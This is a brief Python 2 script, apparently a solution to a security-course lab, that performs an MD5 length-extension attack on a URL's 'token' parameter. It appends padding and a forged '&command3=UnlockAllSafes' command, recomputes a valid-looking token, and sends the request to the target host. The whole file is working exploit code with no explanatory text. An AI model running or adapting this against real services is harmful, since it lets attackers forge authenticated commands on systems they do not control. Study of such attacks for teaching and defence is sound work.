import httplib, urlparse, sys, pymd5, urllib
url = sys.argv[1]
parsedUrl = urlparse.urlparse(url)
queryDict = urlparse.parse_qs(parsedUrl.query)
state = queryDict['token'][0]

#State

tokenKey = "token="
length_of_m = 8 + (len(parsedUrl.query) - len (tokenKey + "&") - len(state)) # length of value orignally passed into md5
#print length_of_m
padding = pymd5.padding(length_of_m*8)
count = (length_of_m + len(padding))*8

#Count

h = pymd5.md5(state=state.decode("hex"), count=512)
newCommand = "&command3=UnlockAllSafes"
h.update(newCommand) # updates token to include command3
newToken = h.hexdigest() # replaces token value in list with new value

#newToken

newQuery = tokenKey + newToken + parsedUrl.query[(len(tokenKey)+len(state)):] + urllib.quote(padding) + newCommand

#newQuery

conn = httplib.HTTPConnection(parsedUrl.hostname)
conn.request("GET", parsedUrl.path + "?" + newQuery)
print conn.getresponse().read()